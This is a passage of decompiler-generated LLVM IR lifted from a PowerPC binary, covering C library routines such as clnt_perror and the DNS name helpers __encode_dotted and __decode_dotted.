  %v3_100156c0 = inttoptr i32 %v2_100156c0 to i8*
  store i8 10, i8* %v3_100156c0, align 1
  %v0_100156d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100156c4

dec_label_pc_100156c4:                            ; preds = %entry, %dec_label_pc_100156ac
  %v0_100156d4 = phi i32 [ 0, %entry ], [ %v0_100156d4.pre, %dec_label_pc_100156ac ]
  ret i32 %v0_100156d4

; uselistorder directives
  uselistorder i32 %v2_10015578, { 1, 0, 2 }
  uselistorder i32 %v2_10015554, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 2, 11, 1, 13, 3, 4, 14, 18, 16, 17, 15, 0, 12, 5, 6, 7, 9, 10, 8 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 2, 0, 3 }
  uselistorder i32 17, { 13, 0, 3, 1, 4, 5, 19, 6, 14, 15, 16, 17, 7, 8, 9, 10, 11, 2, 22, 23, 20, 21, 18, 12 }
  uselistorder i32 (i32, i8*)* @strcpy, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32)* @sprintf, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 4, { 5, 261, 211, 152, 347, 6, 7, 417, 418, 8, 131, 153, 9, 10, 350, 348, 349, 170, 351, 352, 353, 147, 11, 354, 355, 356, 357, 358, 359, 360, 12, 361, 13, 14, 157, 362, 363, 171, 364, 365, 366, 262, 263, 419, 420, 166, 250, 195, 15, 16, 266, 17, 18, 148, 330, 19, 20, 21, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 23, 22, 24, 25, 427, 428, 429, 430, 431, 432, 367, 222, 223, 433, 434, 172, 26, 27, 28, 288, 29, 173, 30, 31, 137, 32, 33, 34, 35, 36, 37, 375, 376, 174, 38, 39, 196, 161, 197, 162, 198, 163, 199, 164, 435, 224, 270, 421, 422, 423, 424, 425, 40, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 439, 440, 441, 247, 248, 249, 436, 437, 438, 41, 42, 251, 252, 253, 254, 255, 256, 257, 258, 259, 43, 260, 44, 45, 46, 47, 264, 265, 462, 48, 134, 267, 268, 269, 49, 461, 426, 271, 272, 442, 273, 274, 275, 276, 277, 278, 50, 279, 443, 444, 445, 175, 200, 201, 155, 202, 203, 204, 205, 206, 154, 0, 207, 208, 280, 446, 167, 447, 452, 183, 184, 185, 51, 281, 282, 283, 284, 285, 286, 287, 463, 3, 52, 1, 448, 4, 53, 2, 377, 176, 54, 370, 371, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 449, 450, 472, 399, 138, 504, 511, 55, 56, 57, 58, 59, 289, 290, 60, 291, 61, 292, 62, 473, 63, 293, 64, 65, 294, 66, 331, 332, 333, 337, 338, 339, 67, 295, 68, 69, 70, 296, 71, 297, 298, 479, 481, 480, 477, 478, 453, 454, 455, 456, 464, 465, 466, 467, 482, 483, 484, 468, 469, 457, 458, 168, 378, 177, 379, 380, 139, 72, 73, 381, 74, 382, 383, 384, 385, 386, 387, 149, 75, 388, 495, 496, 400, 76, 77, 78, 150, 79, 165, 451, 80, 81, 505, 506, 507, 178, 508, 509, 510, 82, 497, 498, 499, 135, 136, 500, 501, 179, 502, 503, 83, 84, 85, 86, 87, 88, 89, 90, 401, 91, 402, 403, 158, 404, 405, 406, 407, 408, 92, 93, 409, 410, 159, 411, 412, 160, 413, 414, 416, 94, 95, 132, 133, 415, 372, 96, 373, 180, 374, 368, 369, 328, 305, 485, 486, 97, 98, 99, 156, 100, 140, 101, 141, 299, 300, 102, 169, 103, 104, 105, 460, 106, 107, 459, 108, 301, 302, 303, 304, 306, 307, 308, 474, 475, 476, 109, 110, 111, 492, 493, 487, 341, 151, 343, 112, 186, 187, 188, 189, 190, 191, 192, 193, 113, 194, 114, 310, 309, 209, 311, 312, 313, 488, 489, 490, 342, 471, 470, 494, 491, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 344, 327, 329, 345, 181, 115, 116, 334, 117, 118, 119, 120, 121, 142, 122, 123, 124, 182, 125, 126, 143, 144, 335, 127, 336, 145, 128, 340, 146, 129, 346, 130, 210 }
  uselistorder label %dec_label_pc_100156c4, { 1, 0 }
  uselistorder label %dec_label_pc_100156ac, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_100156d8 = load i32, i32* @lr, align 4
  store i32 268523244, i32* @lr, align 4
  %v0_100156e8 = call i32 @__GI_clnt_sperror()
  %v3_100156f4 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 %v0_100156d8, i32* @lr, align 4
  %v2_10015704 = call i32 @__GI_fputs(i32 %v0_100156e8, i32 %v3_100156f4)
  ret i32 %v2_10015704

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 5, 7, 6, 4, 1, 3, 0, 2 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1001570c = load i32, i32* @lr, align 4
  store i32 %v0_1001570c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10015718 = load i32, i32* @r4, align 4
  store i32 %v0_10015718, i32* @r29, align 4
  %v0_1001571c = load i32, i32* @r5, align 4
  store i32 %v0_1001571c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001578813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001578813, label %dec_label_pc_100157a4, label %dec_label_pc_10015798

dec_label_pc_1001572c:                            ; preds = %dec_label_pc_10015798
  store i32 268523312, i32* @lr, align 4
  %v3_1001572c = call i32 @__GI_strchr(i32 %v0_1001579814, i32 46)
  store i32 %v3_1001572c, i32* @r30, align 4
  %v3_10015730 = icmp eq i32 %v3_1001572c, 0
  %v0_10015734 = load i32, i32* @r31, align 4
  store i32 %v0_10015734, i32* @r3, align 4
  %v2_10015738 = sub i32 %v3_1001572c, %v0_10015734
  store i32 %v2_10015738, i32* %r0.global-to-local, align 4
  br i1 %v3_10015730, label %dec_label_pc_10015740, label %dec_label_pc_10015748

dec_label_pc_10015740:                            ; preds = %dec_label_pc_1001572c
  %v0_10015740 = call i32 @__GI_strlen()
  store i32 %v0_10015740, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10015740, 16777216
  %v1_10015744 = sdiv i32 %sext, 16777216
  store i32 %v1_10015744, i32* %r0.global-to-local, align 4
  %v0_10015758.pre = load i32, i32* @r31, align 4
  %v0_10015768.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10015748

dec_label_pc_10015748:                            ; preds = %dec_label_pc_1001572c, %dec_label_pc_10015740
  %v0_10015768 = phi i32 [ %v3_1001572c, %dec_label_pc_1001572c ], [ %v0_10015768.pre, %dec_label_pc_10015740 ]
  %v0_10015758 = phi i32 [ %v0_10015734, %dec_label_pc_1001572c ], [ %v0_10015758.pre, %dec_label_pc_10015740 ]
  %v0_10015774 = phi i32 [ %v2_10015738, %dec_label_pc_1001572c ], [ %v1_10015744, %dec_label_pc_10015740 ]
  %v0_1001574c = load i32, i32* @r28, align 4
  %v1_1001574c = load i32, i32* %r27.global-to-local, align 4
  %v2_1001574c = sub i32 %v1_1001574c, %v0_1001574c
  %v1_10015750 = add i32 %v0_1001574c, 1
  store i32 %v1_10015750, i32* %r11.global-to-local, align 4
  %v1_10015754 = add i32 %v2_1001574c, -1
  store i32 %v0_10015758, i32* @r4, align 4
  %v0_1001575c = load i32, i32* @r29, align 4
  %v2_1001575c = add i32 %v0_1001575c, %v1_10015750
  store i32 %v2_1001575c, i32* @r3, align 4
  store i32 %v0_10015774, i32* @r5, align 4
  %v2_10015764 = icmp ult i32 %v0_10015774, %v1_10015754
  %v1_10015768 = add i32 %v0_10015768, 1
  store i32 %v1_10015768, i32* @r31, align 4
  %v3_10015748.not = icmp ne i32 %v0_10015774, 0
  %or.cond = and i1 %v2_10015764, %v3_10015748.not
  br i1 %or.cond, label %dec_label_pc_10015774, label %dec_label_pc_100157bc

dec_label_pc_10015774:                            ; preds = %dec_label_pc_10015748
  %v3_10015774 = trunc i32 %v0_10015774 to i8
  %v4_10015774 = add i32 %v0_1001575c, %v0_1001574c
  %v5_10015774 = inttoptr i32 %v4_10015774 to i8*
  store i8 %v3_10015774, i8* %v5_10015774, align 1
  %v0_10015778 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015778 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015778 = add i32 %v1_10015778, %v0_10015778
  store i32 %v2_10015778, i32* @r28, align 4
  store i32 268523392, i32* @lr, align 4
  %v0_1001577c = call i32 @memcpy()
  store i32 %v0_1001577c, i32* %r3.global-to-local, align 4
  %v0_10015780 = load i32, i32* @r30, align 4
  %v3_10015780 = icmp eq i32 %v0_10015780, 0
  br i1 %v3_10015780, label %dec_label_pc_100157a4, label %dec_label_pc_10015774.dec_label_pc_10015788_crit_edge

dec_label_pc_10015774.dec_label_pc_10015788_crit_edge: ; preds = %dec_label_pc_10015774
  %v0_10015788.pre = load i32, i32* @r31, align 4
  %v3_10015788 = icmp eq i32 %v0_10015788.pre, 0
  store i32 %v0_10015788.pre, i32* @r3, align 4
  br i1 %v3_10015788, label %dec_label_pc_100157a4, label %dec_label_pc_10015798

dec_label_pc_10015798:                            ; preds = %entry, %dec_label_pc_10015774.dec_label_pc_10015788_crit_edge
  %v0_1001579814 = phi i32 [ %v0_10015788.pre, %dec_label_pc_10015774.dec_label_pc_10015788_crit_edge ], [ %tmp, %entry ]
  %v1_10015798 = inttoptr i32 %v0_1001579814 to i8*
  %v2_10015798 = load i8, i8* %v1_10015798, align 1
  %v3_10015798 = zext i8 %v2_10015798 to i32
  store i32 %v3_10015798, i32* %r0.global-to-local, align 4
  %v3_1001579c = icmp eq i8 %v2_10015798, 0
  br i1 %v3_1001579c, label %dec_label_pc_100157a4, label %dec_label_pc_1001572c

dec_label_pc_100157a4:                            ; preds = %dec_label_pc_10015774.dec_label_pc_10015788_crit_edge, %dec_label_pc_10015774, %dec_label_pc_10015798, %entry
  %v0_100157a4 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100157a4, 1
  br i1 %tmp10, label %dec_label_pc_100157bc, label %dec_label_pc_100157ac

dec_label_pc_100157ac:                            ; preds = %dec_label_pc_100157a4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100157b0 = load i32, i32* @r28, align 4
  %v1_100157b0 = add i32 %v0_100157b0, 1
  store i32 %v1_100157b0, i32* %r3.global-to-local, align 4
  %v1_100157b4 = load i32, i32* @r29, align 4
  %v4_100157b4 = add i32 %v1_100157b4, %v0_100157b0
  %v5_100157b4 = inttoptr i32 %v4_100157b4 to i8*
  store i8 0, i8* %v5_100157b4, align 1
  %v0_100157d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100157c0

dec_label_pc_100157bc:                            ; preds = %dec_label_pc_10015748, %dec_label_pc_100157a4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100157c0

dec_label_pc_100157c0:                            ; preds = %dec_label_pc_100157ac, %dec_label_pc_100157bc
  %v0_100157d0 = phi i32 [ %v0_100157d0.pre, %dec_label_pc_100157ac ], [ -1, %dec_label_pc_100157bc ]
  store i32 %v0_1001570c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100157d0

; uselistorder directives
  uselistorder i32 %v0_1001579814, { 1, 0 }
  uselistorder i32 %v0_10015788.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10015774, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10015744, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 ()* @__GI_strlen, { 23, 19, 46, 45, 44, 43, 42, 41, 40, 22, 21, 39, 11, 12, 13, 47, 38, 0, 37, 1, 36, 35, 34, 18, 5, 4, 17, 16, 15, 3, 2, 14, 33, 32, 10, 31, 9, 30, 29, 8, 28, 7, 27, 6, 26, 24, 25, 20 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100157c0, { 1, 0 }
  uselistorder label %dec_label_pc_100157bc, { 1, 0 }
  uselistorder label %dec_label_pc_100157a4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10015798, { 1, 0 }
  uselistorder label %dec_label_pc_10015748, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_100157d8 = call i32 @__asm_mfcr()
  store i32 %v0_100157d8, i32* @r26, align 4
  %v3_100157e4 = icmp eq i32 %v0_100157d8, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_100157f4 = load i32, i32* @r6, align 4
  store i32 %v0_100157f4, i32* @r24, align 4
  br i1 %v3_100157e4, label %dec_label_pc_100158ac, label %dec_label_pc_100157fc

dec_label_pc_100157fc:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001588814 = load i32, i32* @r4, align 4
  %v2_1001588815 = add i32 %v1_1001588814, %v0_100157d8
  %v3_1001588816 = inttoptr i32 %v2_1001588815 to i8*
  %v4_1001588817 = load i8, i8* %v3_1001588816, align 1
  %v5_1001588818 = zext i8 %v4_1001588817 to i32
  store i32 %v5_1001588818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1001589020 = icmp eq i8 %v4_1001588817, 0
  br i1 %v3_1001589020, label %dec_label_pc_1001589c, label %dec_label_pc_1001580c

dec_label_pc_1001580c:                            ; preds = %dec_label_pc_100157fc, %dec_label_pc_10015884
  %v3_1001588c22 = phi i1 [ %v3_1001588c, %dec_label_pc_10015884 ], [ false, %dec_label_pc_100157fc ]
  %v5_1001588821 = phi i32 [ %v5_10015888, %dec_label_pc_10015884 ], [ %v5_1001588818, %dec_label_pc_100157fc ]
  br i1 %v3_1001588c22, label %dec_label_pc_10015814, label %dec_label_pc_10015810

dec_label_pc_10015810:                            ; preds = %dec_label_pc_1001580c
  %v0_10015810 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015810 = add i32 %v0_10015810, 1
  store i32 %v1_10015810, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015814

dec_label_pc_10015814:                            ; preds = %dec_label_pc_1001580c, %dec_label_pc_10015810
  %v1_10015814 = call i32 @__asm_rlwinm(i32 %v5_1001588821, i32 0, i32 24, i32 25)
  %v0_10015818 = load i32, i32* @r4, align 4
  %v1_10015818 = add i32 %v0_10015818, 1
  store i32 %v1_10015818, i32* @r30, align 4
  %v3_1001581c = icmp eq i32 %v1_10015814, 192
  br i1 %v3_1001581c, label %dec_label_pc_10015824, label %dec_label_pc_10015844

dec_label_pc_10015824:                            ; preds = %dec_label_pc_10015814
  %v0_10015824 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015824, label %dec_label_pc_1001582c, label %dec_label_pc_10015828

dec_label_pc_10015828:                            ; preds = %dec_label_pc_10015824
  %v0_10015828 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015828 = add i32 %v0_10015828, 1
  store i32 %v1_10015828, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1001582c

dec_label_pc_1001582c:                            ; preds = %dec_label_pc_10015824, %dec_label_pc_10015828
  %v0_1001582c = load i32, i32* @r26, align 4
  %v2_1001582c = add i32 %v0_1001582c, %v1_10015818
  %v3_1001582c = inttoptr i32 %v2_1001582c to i8*
  %v4_1001582c = load i8, i8* %v3_1001582c, align 1
  %v5_1001582c = zext i8 %v4_1001582c to i32
  %v1_10015830 = call i32 @__asm_rlwinm(i32 %v5_1001588821, i32 8, i32 18, i32 23)
  %v0_10015834 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10015834, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1001583c = or i32 %v5_1001582c, %v1_10015830
  store i32 %v2_1001583c, i32* @r4, align 4
  br label %dec_label_pc_10015884

dec_label_pc_10015844:                            ; preds = %dec_label_pc_10015814
  %v0_10015844 = load i32, i32* %r11.global-to-local, align 4
  %v2_10015844 = add i32 %v0_10015844, %v5_1001588821
  store i32 %v2_10015844, i32* @r29, align 4
  %v1_10015848 = add i32 %v2_10015844, 1
  store i32 %v1_10015848, i32* @r28, align 4
  %v1_1001584c = load i32, i32* @r24, align 4
  %v2_1001584c = icmp ult i32 %v1_10015848, %v1_1001584c
  br i1 %v2_1001584c, label %dec_label_pc_10015854, label %dec_label_pc_100158ac

dec_label_pc_10015854:                            ; preds = %dec_label_pc_10015844
  %v0_10015854 = load i32, i32* @r26, align 4
  %v2_10015854 = add i32 %v0_10015854, %v1_10015818
  store i32 %v2_10015854, i32* @r4, align 4
  %v0_10015858 = load i32, i32* @r25, align 4
  %v2_10015858 = add i32 %v0_10015858, %v0_10015844
  store i32 %v2_10015858, i32* @r3, align 4
  store i32 %v5_1001588821, i32* @r5, align 4
  store i32 268523620, i32* @lr, align 4
  %v0_10015860 = call i32 @memcpy()
  %v0_10015864 = load i32, i32* @r30, align 4
  %v2_10015864 = add i32 %v0_10015864, %v5_1001588821
  store i32 %v2_10015864, i32* @r4, align 4
  %v0_10015868 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015868, label %dec_label_pc_10015870, label %dec_label_pc_1001586c

dec_label_pc_1001586c:                            ; preds = %dec_label_pc_10015854
  %v0_1001586c = load i32, i32* %r27.global-to-local, align 4
  %v2_1001586c = add i32 %v0_1001586c, %v5_1001588821
  store i32 %v2_1001586c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015870

dec_label_pc_10015870:                            ; preds = %dec_label_pc_10015854, %dec_label_pc_1001586c
  %v0_10015870 = load i32, i32* @r26, align 4
  %v2_10015870 = add i32 %v0_10015870, %v2_10015864
  %v3_10015870 = inttoptr i32 %v2_10015870 to i8*
  %v4_10015870 = load i8, i8* %v3_10015870, align 1
  %v3_10015874 = icmp eq i8 %v4_10015870, 0
  br i1 %v3_10015874, label %dec_label_pc_10015880, label %dec_label_pc_1001587c

dec_label_pc_1001587c:                            ; preds = %dec_label_pc_10015870
  br label %dec_label_pc_10015880

dec_label_pc_10015880:                            ; preds = %dec_label_pc_10015870, %dec_label_pc_1001587c
  %v0_10015880.off0 = phi i8 [ 0, %dec_label_pc_10015870 ], [ 46, %dec_label_pc_1001587c ]
  %v1_10015880 = load i32, i32* @r25, align 4
  %v2_10015880 = load i32, i32* @r29, align 4
  %v4_10015880 = add i32 %v2_10015880, %v1_10015880
  %v5_10015880 = inttoptr i32 %v4_10015880 to i8*
  store i8 %v0_10015880.off0, i8* %v5_10015880, align 1
  %v0_10015884.pre = load i32, i32* @r28, align 4
  %v0_1001588c.pre.pre = load i32, i32* @r23, align 4
  %v1_10015888.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015884

dec_label_pc_10015884:                            ; preds = %dec_label_pc_1001582c, %dec_label_pc_10015880
  %v1_10015888 = phi i32 [ %v2_1001583c, %dec_label_pc_1001582c ], [ %v1_10015888.pre, %dec_label_pc_10015880 ]
  %v0_1001588c.pre = phi i32 [ 0, %dec_label_pc_1001582c ], [ %v0_1001588c.pre.pre, %dec_label_pc_10015880 ]
  %v0_10015884 = phi i32 [ %v0_10015834, %dec_label_pc_1001582c ], [ %v0_10015884.pre, %dec_label_pc_10015880 ]
  %v0_10015888.pre = load i32, i32* @r26, align 4
  store i32 %v0_10015884, i32* %r11.global-to-local, align 4
  %v2_10015888 = add i32 %v1_10015888, %v0_10015888.pre
  %v3_10015888 = inttoptr i32 %v2_10015888 to i8*
  %v4_10015888 = load i8, i8* %v3_10015888, align 1
  %v5_10015888 = zext i8 %v4_10015888 to i32
  store i32 %v5_10015888, i32* @r31, align 4
  %v3_1001588c = icmp eq i32 %v0_1001588c.pre, 0
  store i1 %v3_1001588c, i1* %cr4_eq.global-to-local, align 1
  %v3_10015890 = icmp eq i8 %v4_10015888, 0
  br i1 %v3_10015890, label %dec_label_pc_10015898, label %dec_label_pc_1001580c

dec_label_pc_10015898:                            ; preds = %dec_label_pc_10015884
  %v0_100158a0.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1001588c, label %dec_label_pc_100158ac, label %dec_label_pc_1001589c

dec_label_pc_1001589c:                            ; preds = %dec_label_pc_100157fc, %dec_label_pc_10015898
  %v0_100158a0.pre26 = phi i32 [ %v0_100158a0.pre.pre, %dec_label_pc_10015898 ], [ 0, %dec_label_pc_100157fc ]
  %v1_1001589c = add i32 %v0_100158a0.pre26, 1
  store i32 %v1_1001589c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100158ac

dec_label_pc_100158ac:                            ; preds = %dec_label_pc_10015844, %dec_label_pc_10015898, %dec_label_pc_1001589c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1001589c, %dec_label_pc_1001589c ], [ %v0_100158a0.pre.pre, %dec_label_pc_10015898 ], [ -1, %dec_label_pc_10015844 ]
  %v1_100158bc = call %0 @__asm_mtcrf(i32 8, i32 %v0_100157d8)
  %v9_100158bc = extractvalue %0 %v1_100158bc, 7
  store i4 %v9_100158bc, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_100158a0.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1001588c, { 0, 2, 1 }
  uselistorder i32 %v5_10015888, { 1, 0 }
  uselistorder i32 %v5_1001588821, { 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %v0_100157d8, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 1, 2, 3, 5, 4, 6, 0 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 7, 8, 3, 10, 9, 5, 0, 1, 2, 12, 4, 11, 6 }
  uselistorder i32 ()* @memcpy, { 21, 20, 19, 18, 17, 16, 15, 28, 27, 13, 26, 3, 32, 11, 10, 0, 9, 8, 7, 14, 1, 6, 5, 4, 31, 25, 2, 30, 29, 24, 23, 12, 22 }
  uselistorder i32* @r5, { 45, 46, 47, 10, 17, 84, 4, 48, 49, 21, 50, 82, 83, 87, 54, 55, 5, 6, 86, 18, 19, 20, 85, 22, 23, 97, 24, 25, 96, 26, 27, 28, 35, 7, 56, 2, 57, 64, 65, 88, 89, 90, 91, 98, 66, 67, 68, 69, 70, 71, 111, 41, 42, 92, 93, 94, 58, 59, 103, 104, 105, 36, 72, 73, 74, 112, 113, 114, 115, 106, 107, 3, 108, 109, 110, 75, 77, 76, 78, 0, 79, 80, 81, 99, 100, 51, 52, 61, 62, 37, 63, 53, 8, 29, 30, 101, 102, 9, 31, 95, 11, 12, 32, 1, 33, 34, 13, 14, 15, 16, 38, 39, 40, 43, 44, 60 }
  uselistorder i32* @r29, { 143, 144, 145, 146, 147, 45, 46, 47, 48, 49, 50, 51, 2, 148, 22, 149, 150, 151, 152, 153, 155, 154, 156, 157, 158, 159, 160, 161, 52, 53, 54, 55, 56, 3, 162, 163, 164, 165, 166, 167, 168, 169, 57, 58, 4, 266, 267, 268, 269, 170, 171, 239, 240, 172, 173, 174, 243, 244, 277, 175, 181, 182, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 0, 241, 242, 59, 60, 61, 62, 63, 65, 64, 66, 67, 68, 282, 69, 70, 5, 71, 6, 72, 73, 74, 75, 76, 77, 78, 79, 7, 283, 80, 245, 31, 8, 32, 246, 247, 248, 249, 250, 263, 264, 265, 82, 81, 83, 84, 85, 86, 87, 303, 304, 221, 222, 223, 220, 224, 29, 251, 252, 9, 253, 254, 255, 256, 257, 258, 305, 306, 307, 308, 309, 270, 271, 139, 140, 310, 311, 312, 313, 272, 273, 274, 275, 314, 10, 315, 321, 322, 323, 284, 285, 286, 287, 288, 276, 213, 214, 215, 216, 217, 11, 218, 219, 331, 332, 333, 225, 226, 12, 227, 259, 260, 261, 190, 191, 23, 192, 183, 184, 185, 189, 186, 30, 13, 1, 187, 188, 14, 262, 228, 229, 230, 231, 232, 233, 234, 237, 15, 21, 16, 238, 33, 235, 236, 334, 335, 336, 337, 193, 194, 195, 196, 197, 198, 199, 17, 200, 176, 177, 178, 179, 180, 132, 133, 134, 135, 136, 128, 327, 328, 24, 25, 329, 108, 109, 110, 316, 317, 320, 324, 18, 325, 88, 89, 90, 91, 92, 19, 93, 94, 95, 96, 97, 98, 26, 99, 278, 279, 280, 281, 100, 101, 102, 103, 104, 34, 35, 105, 106, 20, 107, 36, 37, 294, 295, 296, 297, 298, 27, 111, 28, 112, 113, 114, 115, 116, 38, 39, 40, 41, 42, 326, 43, 44, 299, 300, 301, 302, 117, 118, 119, 289, 290, 291, 292, 293, 120, 121, 122, 123, 124, 125, 126, 127, 330, 129, 318, 319, 130, 131, 137, 138, 141, 142 }
  uselistorder i32* @r28, { 5, 70, 71, 72, 73, 74, 75, 40, 41, 80, 81, 76, 77, 78, 79, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 24, 6, 23, 25, 26, 27, 28, 29, 30, 92, 96, 93, 94, 95, 2, 31, 7, 32, 33, 164, 165, 166, 167, 97, 98, 129, 154, 155, 156, 123, 124, 34, 35, 36, 37, 38, 39, 42, 43, 44, 180, 181, 18, 45, 3, 16, 19, 8, 4, 185, 186, 130, 9, 157, 158, 159, 160, 161, 10, 187, 188, 189, 202, 209, 168, 169, 170, 171, 172, 173, 174, 175, 176, 198, 199, 200, 201, 182, 183, 125, 126, 203, 204, 205, 206, 207, 162, 163, 107, 11, 108, 109, 101, 102, 103, 104, 105, 106, 131, 132, 133, 12, 134, 135, 13, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 0, 152, 153, 20, 21, 22, 208, 110, 111, 112, 113, 114, 14, 115, 15, 116, 117, 118, 119, 120, 121, 122, 127, 128, 99, 100, 63, 64, 60, 55, 56, 190, 191, 192, 197, 193, 194, 196, 46, 47, 177, 178, 179, 48, 49, 50, 51, 52, 53, 1, 54, 184, 17, 57, 58, 59, 65, 66, 195, 61, 62, 67, 68, 69 }
  uselistorder i32 23, { 2, 0, 1, 6, 7, 3, 4, 5 }
  uselistorder i32 18, { 6, 0, 8, 9, 7, 10, 1, 2, 11, 3, 4, 5 }
  uselistorder i32 8, { 147, 148, 73, 58, 0, 149, 150, 151, 152, 35, 36, 153, 154, 155, 156, 157, 158, 59, 60, 37, 30, 31, 32, 61, 62, 63, 64, 65, 159, 71, 27, 66, 67, 68, 1, 69, 70, 160, 161, 162, 34, 208, 172, 87, 205, 206, 72, 2, 3, 4, 5, 6, 7, 74, 225, 75, 76, 77, 78, 224, 79, 80, 81, 82, 83, 84, 85, 207, 38, 86, 88, 89, 209, 210, 90, 91, 92, 33, 93, 94, 211, 48, 50, 49, 51, 52, 212, 213, 214, 215, 53, 95, 96, 8, 164, 176, 177, 178, 179, 180, 181, 182, 183, 26, 216, 217, 218, 235, 236, 265, 268, 24, 138, 139, 237, 28, 97, 29, 136, 143, 98, 247, 246, 244, 245, 220, 221, 222, 226, 227, 228, 248, 249, 250, 9, 173, 174, 175, 39, 262, 263, 264, 10, 269, 11, 266, 267, 165, 166, 219, 167, 137, 184, 185, 186, 187, 188, 40, 189, 190, 191, 192, 12, 13, 193, 194, 25, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 23, 14, 238, 239, 240, 168, 169, 170, 171, 163, 134, 110, 111, 251, 252, 15, 16, 17, 18, 19, 54, 223, 55, 99, 100, 101, 104, 106, 107, 108, 105, 109, 102, 103, 112, 113, 114, 241, 242, 243, 258, 259, 260, 253, 254, 145, 44, 41, 45, 46, 47, 42, 115, 116, 117, 256, 255, 118, 119, 120, 121, 56, 232, 234, 124, 125, 126, 229, 230, 231, 233, 127, 144, 122, 123, 261, 257, 128, 129, 130, 131, 132, 133, 57, 43, 135, 146, 20, 21, 22, 140, 141, 142 }
  uselistorder i32* @r30, {}
  uselistorder i1 false, { 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 17, 0, 16, 18, 19, 20, 5, 1, 13, 2, 12, 21 }
